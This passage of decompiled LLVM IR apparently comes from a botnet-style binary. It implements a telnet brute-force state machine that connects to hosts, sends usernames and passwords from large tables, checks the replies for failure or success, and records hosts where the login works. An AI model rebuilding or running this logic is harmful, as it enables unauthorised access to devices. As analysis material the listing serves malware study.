  store i32 %v1_b7fc, i32* %r2.global-to-local, align 4
  %v2_b80c = call i32 @__libc_fcntl(i32 %v0_b800, i32 4)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b828 = load i32, i32* %v1_b7a4, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_b83c = call i32 @__libc_connect(i32 %v2_b828, i32 %v2_b82c, i32 16)
  %v3_b844 = icmp eq i32 %v3_b83c, -1
  br i1 %v3_b844, label %dec_label_pc_b84c, label %dec_label_pc_b884

dec_label_pc_b84c:                                ; preds = %dec_label_pc_b7b0
  %v0_b84c = call i32 @__GI___errno_location()
  %v1_b854 = inttoptr i32 %v0_b84c to i32*
  %v2_b854 = load i32, i32* %v1_b854, align 4
  %v7_b858 = icmp eq i32 %v2_b854, 115
  br i1 %v7_b858, label %dec_label_pc_b884, label %dec_label_pc_b860

dec_label_pc_b860:                                ; preds = %dec_label_pc_b84c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b87c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_b884:                                ; preds = %dec_label_pc_b7b0, %dec_label_pc_b84c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b8a4 = call i32 @advance_state(i32* nonnull %v1_b7a4, i32 1)
  br label %dec_label_pc_c520

dec_label_pc_b8c0.lr.ph:                          ; preds = %dec_label_pc_b4e4
  br label %dec_label_pc_b8c0

dec_label_pc_b8c0:                                ; preds = %dec_label_pc_b8c0.lr.ph, %dec_label_pc_b8c0
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b8c0.lr.ph ], [ %v1_b8d4, %dec_label_pc_b8c0 ]
  store i32 %v2_b8ac, i32* %r2.global-to-local, align 4
  %v5_b8cc = mul nuw nsw i32 %storemerge610, 4
  %v6_b8cc = add i32 %v5_b8cc, %v2_b8ac
  %v7_b8cc = inttoptr i32 %v6_b8cc to i32*
  store i32 0, i32* %v7_b8cc, align 4
  %v1_b8d4 = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_b8d4, 32
  br i1 %tmp39, label %dec_label_pc_b8c0, label %dec_label_pc_b8e8

dec_label_pc_b8e8:                                ; preds = %dec_label_pc_b8c0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b900 = inttoptr i32 %v2_b498 to i32*
  %v2_b900 = load i32, i32* %v1_b900, align 4
  %v3_b904 = udiv i32 %v2_b900, 32
  %v3_b918 = mul nuw nsw i32 %v3_b904, 4
  %v2_b920 = add i32 %v3_b918, %v19_b28c
  store i32 %v2_b920, i32* %r2.global-to-local, align 4
  %v2_b924 = add i32 %v2_b920, -300
  %v1_b928 = inttoptr i32 %v2_b924 to i32*
  %v2_b928 = load i32, i32* %v1_b928, align 4
  store i32 %v2_b928, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b944 = load i32, i32* %v1_b900, align 4
  %v1_b948 = urem i32 %v2_b944, 32
  %v6_b950 = shl i32 1, %v1_b948
  %v2_b954 = or i32 %v6_b950, %v2_b928
  store i32 %v2_b954, i32* %v1_b928, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b99c = load i32, i32* %v1_b900, align 4
  %v1_b9a0 = add i32 %v2_b99c, 1
  store i32 %v1_b9a0, i32* %r2.global-to-local, align 4
  store i32 %v2_b8ac, i32* %ip.global-to-local, align 4
  %v1_b9ac = load i32, i32* @sp, align 4
  %v2_b9ac = inttoptr i32 %v1_b9ac to i32*
  store i32 %v2_b9a8, i32* %v2_b9ac, align 4
  %v0_b9b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b8ac, i32* %r2.global-to-local, align 4
  %v4_b9c0 = load i32, i32* %stack_var_-332, align 4
  %v5_b9c0 = call i32 @__libc_select(i32 %v0_b9b0, i32 0, i32 %v2_b8ac, i32 0, i32 %v4_b9c0)
  %v7_b9d0 = icmp eq i32 %v5_b9c0, 1
  br i1 %v7_b9d0, label %dec_label_pc_b9d8, label %dec_label_pc_badc

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b8e8
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_ba00 = load i32, i32* %v1_b900, align 4
  store i32 %v2_ba00, i32* %r2.global-to-local, align 4
  store i32 %v2_ba04, i32* %ip.global-to-local, align 4
  %v1_ba0c = load i32, i32* @sp, align 4
  %v2_ba0c = inttoptr i32 %v1_ba0c to i32*
  store i32 %v2_ba08, i32* %v2_ba0c, align 4
  %v0_ba10 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ba20 = load i32, i32* %stack_var_-340, align 4
  %v5_ba20 = call i32 @getsockopt(i32 %v0_ba10, i32 1, i32 4, i32 %v2_ba04, i32 %v4_ba20)
  %v3_ba24 = load i32, i32* %stack_var_-340, align 4
  %v2_ba28 = icmp eq i32 %v3_ba24, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_ba28, label %dec_label_pc_ba54, label %dec_label_pc_ba30

dec_label_pc_ba30:                                ; preds = %dec_label_pc_b9d8
  %v3_ba4c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_ba54:                                ; preds = %dec_label_pc_b9d8
  %v2_ba6c = load i32, i32* %v1_b900, align 4
  store i32 %v2_ba6c, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_ba88 = load i32, i32* %v1_b900, align 4
  store i32 %v2_ba88, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ba98 = call i32 @__libc_fcntl(i32 %v2_ba88, i32 3)
  %v1_baa0 = and i32 %v2_ba98, -2049
  store i32 %v1_baa0, i32* @r3, align 4
  %v0_baa4 = load i32, i32* @r4, align 4
  store i32 %v1_baa0, i32* %r2.global-to-local, align 4
  %v2_bab0 = call i32 @__libc_fcntl(i32 %v0_baa4, i32 4)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bad4 = call i32 @advance_state(i32* nonnull %v1_b900, i32 2)
  br label %dec_label_pc_c520

dec_label_pc_badc:                                ; preds = %dec_label_pc_b8e8
  %v3_bae0 = icmp eq i32 %v5_b9c0, -1
  br i1 %v3_bae0, label %dec_label_pc_bae8, label %dec_label_pc_bb0c

dec_label_pc_bae8:                                ; preds = %dec_label_pc_badc
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bb04 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_badc
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bb28 = add i32 %v2_b494, %v2_bb24
  %v1_bb2c = inttoptr i32 %v2_bb28 to i32*
  %v2_bb2c = load i32, i32* %v1_bb2c, align 4
  %v1_bb30 = add i32 %v2_bb2c, 5
  store i32 %v1_bb30, i32* @r4, align 4
  %v2_bb38 = call i32 @__GI_time(i32* null)
  %v0_bb40 = load i32, i32* @r4, align 4
  %v3_bb40 = icmp ult i32 %v0_bb40, %v2_bb38
  br i1 %v3_bb40, label %dec_label_pc_bb48, label %dec_label_pc_c520

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bb0c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bb64 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bb84 = inttoptr i32 %v2_b498 to i32*
  %v2_bb84 = load i32, i32* %v1_bb84, align 4
  store i32 %v2_bb84, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bba4 = add i32 %v2_b494, %v2_bba0
  %v1_bba8 = inttoptr i32 %v2_bba4 to i32*
  %v2_bba8 = load i32, i32* %v1_bba8, align 4
  store i32 %v2_bba8, i32* %r2.global-to-local, align 4
  %v1_bbb0 = load i32, i32* @sp, align 4
  %v2_bbb0 = inttoptr i32 %v1_bbb0 to i32*
  store i32 ptrtoint (i32* @global_var_27620 to i32), i32* %v2_bbb0, align 4
  %v0_bbb4 = load i32, i32* %ip.global-to-local, align 4
  %v4_bbc0 = inttoptr i32 %v2_bba8 to i8*
  %v5_bbc0 = call i32 @read_until_response(i32 %v0_bbb4, i32 %arg1, i8* %v4_bbc0, i32 1024)
  %v2_bbc8 = icmp eq i32 %v5_bbc0, 0
  br i1 %v2_bbc8, label %dec_label_pc_bc58, label %dec_label_pc_bbd0

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bb6c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bbec = add i32 %v2_b498, 24
  %v1_bbf0 = inttoptr i32 %v2_bbec to i32*
  %v2_bbf0 = load i32, i32* %v1_bbf0, align 4
  %v1_bbf8 = call i32 @contains_fail(i32 %v2_bbf0)
  %v2_bc00 = icmp eq i32 %v1_bbf8, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_bc00, label %dec_label_pc_bc30, label %dec_label_pc_bc08

dec_label_pc_bc08:                                ; preds = %dec_label_pc_bbd0
  %v3_bc28 = call i32 @advance_state(i32* %v1_bb84, i32 0)
  br label %dec_label_pc_c520

dec_label_pc_bc30:                                ; preds = %dec_label_pc_bbd0
  %v3_bc50 = call i32 @advance_state(i32* %v1_bb84, i32 3)
  br label %dec_label_pc_c520

dec_label_pc_bc58:                                ; preds = %dec_label_pc_bb6c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bc78 = load i32, i32* %v1_b4a0, align 4
  %v1_bc7c = add i32 %v2_bc78, 7
  store i32 %v1_bc7c, i32* @r4, align 4
  %v2_bc84 = call i32 @__GI_time(i32* null)
  %v0_bc8c = load i32, i32* @r4, align 4
  %v3_bc8c = icmp ult i32 %v0_bc8c, %v2_bc84
  br i1 %v3_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_c520

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc58
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bcb0 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bcb8:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bcd0 = inttoptr i32 %v2_b498 to i32*
  %v2_bcd0 = load i32, i32* %v1_bcd0, align 4
  store i32 %v2_bcd0, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bcf4 = add i32 %v2_b498, 10
  %v2_bcf4 = inttoptr i32 %v1_bcf4 to i8*
  %v3_bcf4 = load i8, i8* %v2_bcf4, align 2
  %v4_bcf4 = zext i8 %v3_bcf4 to i32
  store i32 %v4_bcf4, i32* %r2.global-to-local, align 4
  %v4_bd00 = mul nuw nsw i32 %v4_bcf4, 4
  %v5_bd00 = add i32 %v4_bd00, ptrtoint ([769 x i8*]* @global_var_269ec.369 to i32)
  %v6_bd00 = inttoptr i32 %v5_bd00 to i32*
  %v7_bd00 = load i32, i32* %v6_bd00, align 4
  store i32 %v7_bd00, i32* @r5, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bd24 = load i8, i8* %v2_bcf4, align 2
  %v4_bd24 = zext i8 %v3_bd24 to i32
  store i32 %v4_bd24, i32* %r2.global-to-local, align 4
  %v4_bd30 = mul nuw nsw i32 %v4_bd24, 4
  %v5_bd30 = add i32 %v4_bd30, ptrtoint ([769 x i8*]* @global_var_269ec.369 to i32)
  %v6_bd30 = inttoptr i32 %v5_bd30 to i32*
  %v7_bd30 = load i32, i32* %v6_bd30, align 4
  %v1_bd34 = inttoptr i32 %v7_bd30 to i8*
  %v3_bd38 = call i32 @strlen(i8* %v1_bd34)
  %v0_bd40 = load i32, i32* @r4, align 4
  %v0_bd44 = load i32, i32* @r5, align 4
  store i32 %v3_bd38, i32* %r2.global-to-local, align 4
  %v4_bd50 = call i32 @__libc_send(i32 %v0_bd40, i32 %v0_bd44, i32 %v3_bd38, i32 16384)
  %v1_bd58 = icmp slt i32 %v4_bd50, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_bd58, label %dec_label_pc_bd60, label %dec_label_pc_bd84

dec_label_pc_bd60:                                ; preds = %dec_label_pc_bcb8
  %v3_bd7c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bd84:                                ; preds = %dec_label_pc_bcb8
  %v2_bd9c = load i32, i32* %v1_bcd0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_bdb0 = call i32 @__libc_send(i32 %v2_bd9c, i32 ptrtoint ([3 x i8]* @global_var_1cbc4.371 to i32), i32 2, i32 16384)
  %v1_bdb8 = icmp slt i32 %v5_bdb0, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bde4

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd84
  %v3_bddc = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bd84
  %v3_be04 = call i32 @advance_state(i32* nonnull %v1_bcd0, i32 4)
  br label %dec_label_pc_c520

dec_label_pc_be0c:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_be24 = inttoptr i32 %v2_b498 to i32*
  %v2_be24 = load i32, i32* %v1_be24, align 4
  store i32 %v2_be24, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_be44 = add i32 %v2_b494, %v2_bba0
  %v1_be48 = inttoptr i32 %v2_be44 to i32*
  %v2_be48 = load i32, i32* %v1_be48, align 4
  store i32 %v2_be48, i32* %r2.global-to-local, align 4
  %v1_be50 = load i32, i32* @sp, align 4
  %v2_be50 = inttoptr i32 %v1_be50 to i32*
  store i32 ptrtoint (i32* @global_var_27620 to i32), i32* %v2_be50, align 4
  %v0_be54 = load i32, i32* %ip.global-to-local, align 4
  %v4_be60 = inttoptr i32 %v2_be48 to i8*
  %v5_be60 = call i32 @read_until_response(i32 %v0_be54, i32 %arg1, i8* %v4_be60, i32 1024)
  %v2_be68 = icmp eq i32 %v5_be60, 0
  br i1 %v2_be68, label %dec_label_pc_bef8, label %dec_label_pc_be70

dec_label_pc_be70:                                ; preds = %dec_label_pc_be0c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_be8c = add i32 %v2_b498, 24
  %v1_be90 = inttoptr i32 %v2_be8c to i32*
  %v2_be90 = load i32, i32* %v1_be90, align 4
  %v1_be98 = call i32 @contains_fail(i32 %v2_be90)
  %v2_bea0 = icmp eq i32 %v1_be98, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v2_bea0, label %dec_label_pc_bed0, label %dec_label_pc_bea8

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be70
  %v3_bec8 = call i32 @advance_state(i32* %v1_be24, i32 0)
  br label %dec_label_pc_c520

dec_label_pc_bed0:                                ; preds = %dec_label_pc_be70
  %v3_bef0 = call i32 @advance_state(i32* %v1_be24, i32 5)
  br label %dec_label_pc_c520

dec_label_pc_bef8:                                ; preds = %dec_label_pc_be0c
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_bf18 = load i32, i32* %v1_b4a0, align 4
  %v1_bf1c = add i32 %v2_bf18, 3
  store i32 %v1_bf1c, i32* @r4, align 4
  %v2_bf24 = call i32 @__GI_time(i32* null)
  %v0_bf2c = load i32, i32* @r4, align 4
  %v3_bf2c = icmp ult i32 %v0_bf2c, %v2_bf24
  br i1 %v3_bf2c, label %dec_label_pc_bf34, label %dec_label_pc_c520

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bef8
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bf50 = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_bf58:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bf70 = inttoptr i32 %v2_b498 to i32*
  %v2_bf70 = load i32, i32* %v1_bf70, align 4
  store i32 %v2_bf70, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_bf94 = add i32 %v2_b498, 11
  %v2_bf94 = inttoptr i32 %v1_bf94 to i8*
  %v3_bf94 = load i8, i8* %v2_bf94, align 1
  %v4_bf94 = zext i8 %v3_bf94 to i32
  store i32 %v4_bf94, i32* %r2.global-to-local, align 4
  %v4_bfa0 = mul nuw nsw i32 %v4_bf94, 4
  %v5_bfa0 = add i32 %v4_bfa0, ptrtoint ([334 x i8*]* @global_var_270b8.373 to i32)
  %v6_bfa0 = inttoptr i32 %v5_bfa0 to i32*
  %v7_bfa0 = load i32, i32* %v6_bfa0, align 4
  store i32 %v7_bfa0, i32* @r5, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_bfc4 = load i8, i8* %v2_bf94, align 1
  %v4_bfc4 = zext i8 %v3_bfc4 to i32
  store i32 %v4_bfc4, i32* %r2.global-to-local, align 4
  %v4_bfd0 = mul nuw nsw i32 %v4_bfc4, 4
  %v5_bfd0 = add i32 %v4_bfd0, ptrtoint ([334 x i8*]* @global_var_270b8.373 to i32)
  %v6_bfd0 = inttoptr i32 %v5_bfd0 to i32*
  %v7_bfd0 = load i32, i32* %v6_bfd0, align 4
  %v1_bfd4 = inttoptr i32 %v7_bfd0 to i8*
  %v3_bfd8 = call i32 @strlen(i8* %v1_bfd4)
  %v0_bfe0 = load i32, i32* @r4, align 4
  %v0_bfe4 = load i32, i32* @r5, align 4
  store i32 %v3_bfd8, i32* %r2.global-to-local, align 4
  %v4_bff0 = call i32 @__libc_send(i32 %v0_bfe0, i32 %v0_bfe4, i32 %v3_bfd8, i32 16384)
  %v1_bff8 = icmp slt i32 %v4_bff0, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_bff8, label %dec_label_pc_c000, label %dec_label_pc_c024

dec_label_pc_c000:                                ; preds = %dec_label_pc_bf58
  %v3_c01c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c024:                                ; preds = %dec_label_pc_bf58
  %v2_c03c = load i32, i32* %v1_bf70, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_c050 = call i32 @__libc_send(i32 %v2_c03c, i32 ptrtoint ([3 x i8]* @global_var_1cbc4.371 to i32), i32 2, i32 16384)
  %v1_c058 = icmp slt i32 %v5_c050, 0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  br i1 %v1_c058, label %dec_label_pc_c060, label %dec_label_pc_c084

dec_label_pc_c060:                                ; preds = %dec_label_pc_c024
  %v3_c07c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c084:                                ; preds = %dec_label_pc_c024
  %v3_c0a4 = call i32 @advance_state(i32* nonnull %v1_bf70, i32 6)
  br label %dec_label_pc_c520

dec_label_pc_c0ac:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c0c4 = inttoptr i32 %v2_b498 to i32*
  %v2_c0c4 = load i32, i32* %v1_c0c4, align 4
  store i32 %v2_c0c4, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c0e4 = add i32 %v2_b494, %v2_bba0
  %v1_c0e8 = inttoptr i32 %v2_c0e4 to i32*
  %v2_c0e8 = load i32, i32* %v1_c0e8, align 4
  store i32 %v2_c0e8, i32* %r2.global-to-local, align 4
  %v1_c0f0 = load i32, i32* @sp, align 4
  %v2_c0f0 = inttoptr i32 %v1_c0f0 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_27664.375 to i32), i32* %v2_c0f0, align 4
  %v0_c0f4 = load i32, i32* %ip.global-to-local, align 4
  %v4_c100 = inttoptr i32 %v2_c0e8 to i8*
  %v5_c100 = call i32 @read_until_response(i32 %v0_c0f4, i32 %arg1, i8* %v4_c100, i32 1024)
  %v2_c108 = icmp eq i32 %v5_c100, 0
  br i1 %v2_c108, label %dec_label_pc_c324, label %dec_label_pc_c110

dec_label_pc_c110:                                ; preds = %dec_label_pc_c0ac
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c118 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c12c = load i32, i32* @r4, align 4
  %v2_c138 = mul i32 %v0_c12c, 28
  %v2_c140 = add i32 %v2_bb24, %v2_c138
  %v2_c144 = inttoptr i32 %v2_c140 to i32*
  store i32 %v2_c118, i32* %v2_c144, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c168 = load i32, i32* %v1_c0e8, align 4
  %v1_c170 = call i32 @contains_fail(i32 %v2_c168)
  %v2_c178 = icmp eq i32 %v1_c170, 0
  br i1 %v2_c178, label %dec_label_pc_c1a8, label %dec_label_pc_c180

dec_label_pc_c180:                                ; preds = %dec_label_pc_c110
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c1a0 = call i32 @advance_state(i32* %v1_c0c4, i32 0)
  br label %dec_label_pc_c520

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c110
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c1c8 = load i32, i32* %v1_c0e8, align 4
  %v1_c1d0 = call i32 @contains_success(i32 %v2_c1c8)
  %v2_c1d8 = icmp eq i32 %v1_c1d0, 0
  br i1 %v2_c1d8, label %dec_label_pc_c300, label %dec_label_pc_c1e0

dec_label_pc_c1e0:                                ; preds = %dec_label_pc_c1a8
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c200 = add i32 %v2_b498, 9
  %v2_c200 = inttoptr i32 %v1_c200 to i8*
  %v3_c200 = load i8, i8* %v2_c200, align 1
  %v7_c204 = icmp eq i8 %v3_c200, 2
  br i1 %v7_c204, label %dec_label_pc_c20c, label %dec_label_pc_c234

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c1e0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c22c = call i32 @advance_state(i32* %v1_c0c4, i32 7)
  br label %dec_label_pc_c520

dec_label_pc_c234:                                ; preds = %dec_label_pc_c1e0
  %v2_c238 = load i32, i32* @global_var_27918.46, align 4
  store i32 %v2_c238, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c258 = call i32 @get_telstate_host(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  store i32 %v3_c258, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c280 = add i32 %v2_b498, 10
  %v2_c280 = inttoptr i32 %v1_c280 to i8*
  %v3_c280 = load i8, i8* %v2_c280, align 2
  %v4_c280 = zext i8 %v3_c280 to i32
  store i32 %v4_c280, i32* %r2.global-to-local, align 4
  %v4_c28c = mul nuw nsw i32 %v4_c280, 4
  %v5_c28c = add i32 %v4_c28c, ptrtoint ([769 x i8*]* @global_var_269ec.369 to i32)
  %v6_c28c = inttoptr i32 %v5_c28c to i32*
  %v7_c28c = load i32, i32* %v6_c28c, align 4
  store i32 %v7_c28c, i32* @lr, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c2b0 = add i32 %v2_b498, 11
  %v2_c2b0 = inttoptr i32 %v1_c2b0 to i8*
  %v3_c2b0 = load i8, i8* %v2_c2b0, align 1
  %v4_c2b0 = zext i8 %v3_c2b0 to i32
  store i32 %v4_c2b0, i32* %r2.global-to-local, align 4
  %v4_c2bc = mul nuw nsw i32 %v4_c2b0, 4
  %v5_c2bc = add i32 %v4_c2bc, ptrtoint ([334 x i8*]* @global_var_270b8.373 to i32)
  %v6_c2bc = inttoptr i32 %v5_c2bc to i32*
  %v7_c2bc = load i32, i32* %v6_c2bc, align 4
  %v1_c2c0 = load i32, i32* @sp, align 4
  %v2_c2c0 = inttoptr i32 %v1_c2c0 to i32*
  store i32 %v7_c2bc, i32* %v2_c2c0, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  %v0_c2cc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c2cc, i32* @r2, align 4
  %v2_c2d4 = call i32 @Rootsprintf(i32 %v0_c2c4, i32 ptrtoint (i32* @global_var_1cbc8.378 to i32))
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c2f8 = call i32 @advance_state(i32* %v1_c0c4, i32 7)
  br label %dec_label_pc_c520

dec_label_pc_c300:                                ; preds = %dec_label_pc_c1a8
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c31c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c324:                                ; preds = %dec_label_pc_c0ac
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c340 = add i32 %v2_b494, %v2_bb24
  %v1_c344 = inttoptr i32 %v2_c340 to i32*
  %v2_c344 = load i32, i32* %v1_c344, align 4
  %v1_c348 = add i32 %v2_c344, 7
  store i32 %v1_c348, i32* @r4, align 4
  %v2_c350 = call i32 @__GI_time(i32* null)
  %v0_c358 = load i32, i32* @r4, align 4
  %v3_c358 = icmp ult i32 %v0_c358, %v2_c350
  br i1 %v3_c358, label %dec_label_pc_c360, label %dec_label_pc_c520

dec_label_pc_c360:                                ; preds = %dec_label_pc_c324
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c37c = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c3b0:                                ; preds = %dec_label_pc_b4e4
  store i32 %storemerge548, i32* @r4, align 4
  %v2_c3b8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c3cc = load i32, i32* @r4, align 4
  %v2_c3d8 = mul i32 %v0_c3cc, 28
  %v2_c3e0 = add i32 %v2_bb24, %v2_c3d8
  %v2_c3e4 = inttoptr i32 %v2_c3e0 to i32*
  store i32 %v2_c3b8, i32* %v2_c3e4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_c400 = inttoptr i32 %v2_b498 to i32*
  %v2_c400 = load i32, i32* %v1_c400, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_c414 = call i32 @__libc_send(i32 %v2_c400, i32 ptrtoint ([5 x i8]* @global_var_1cc28.380 to i32), i32 4, i32 16384)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c430 = load i32, i32* %v1_c400, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_c444 = call i32 @__libc_send(i32 %v2_c430, i32 ptrtoint ([8 x i8]* @global_var_1cc30.382 to i32), i32 7, i32 16384)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c460 = load i32, i32* %v1_c400, align 4
  store i32 %v2_c460, i32* @r4, align 4
  %v2_c468 = load i32, i32* bitcast ([443 x i8]** @global_var_269e8.385 to i32*), align 4
  store i32 %v2_c468, i32* @r5, align 4
  %v1_c474 = inttoptr i32 %v2_c468 to i8*
  %v3_c478 = call i32 @strlen(i8* %v1_c474)
  %v0_c480 = load i32, i32* @r4, align 4
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v3_c478, i32* %r2.global-to-local, align 4
  %v5_c490 = call i32 @__libc_send(i32 %v0_c480, i32 %v0_c484, i32 %v3_c478, i32 16384)
  %v1_c498 = icmp slt i32 %v5_c490, 0
  br i1 %v1_c498, label %dec_label_pc_c4a0, label %dec_label_pc_c4c4

dec_label_pc_c4a0:                                ; preds = %dec_label_pc_c3b0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_c4bc = call i32 @reset_telstate(i32 %v2_b498, i32 %v3_b374, i32 %v3_b48c)
  br label %dec_label_pc_c520

dec_label_pc_c4c4:                                ; preds = %dec_label_pc_c3b0
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_c4e0 = add i32 %v2_b494, %v2_bb24
  %v1_c4e4 = inttoptr i32 %v2_c4e0 to i32*
  %v2_c4e4 = load i32, i32* %v1_c4e4, align 4
  %v1_c4e8 = add i32 %v2_c4e4, 25
  store i32 %v1_c4e8, i32* @r4, align 4
  %v2_c4f0 = call i32 @__GI_time(i32* null)
  %v0_c4f8 = load i32, i32* @r4, align 4
  %v3_c4f8 = icmp ult i32 %v0_c4f8, %v2_c4f0
  br i1 %v3_c4f8, label %dec_label_pc_c500, label %dec_label_pc_c520

dec_label_pc_c500:                                ; preds = %dec_label_pc_c4c4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
